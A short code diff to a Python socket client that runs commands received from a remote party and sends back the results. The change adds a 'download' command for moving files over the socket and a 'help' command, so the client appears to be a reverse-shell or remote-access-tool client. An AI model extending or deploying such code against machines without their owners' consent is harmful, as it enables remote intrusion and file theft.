@@ -33,12 +33,19 @@ class Client:
                 res=tools.execute(self.osm,cm)
               
                 self.s.send(res.encode())
-              
+            elif cm[0]=="download":
+                try:
+                    res=tools.download(self.s,cm[1],8192)
+                    self.s.send(res.encode())
+                except:
+                    self.s.send("no file specified".encode())
             elif cmd1=="exit":
                 print("exit")
                 
                 self.s.close()
                 break
+            elif cmd1=="help":
+                self.s.send(tools.help().encode())
             else:
                 res="unknown command"
                 self.s.send(res.encode())
